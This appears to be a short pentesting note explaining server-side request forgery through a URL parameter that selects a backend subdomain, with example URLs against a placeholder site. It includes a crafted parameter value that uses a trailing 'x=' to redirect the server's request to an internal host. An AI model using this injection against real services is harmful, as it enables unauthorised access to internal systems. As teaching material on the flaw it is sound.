# SSRF via injection

We have the ability through the server parameter, to choose the subdomain to use:

```bash
https://website.com/item/3?server=api -> https://api.website.com/api/item?id=3
```

That is, we can overwrite the following part of the URL:

```bash
https://<INJECT>.website.com/...
```

In this case, we can abuse this to search for something else of value:

```bash
https://website.com/item/3?server=dev.website.com/user?id=9&x=
```

The **x=** is used to comment/ignore the remaining domain (**.website.com**). So the URL would look like this:

```bash
https://dev.website.com/user?id=9&x=.website.com/api/item?id=2
```
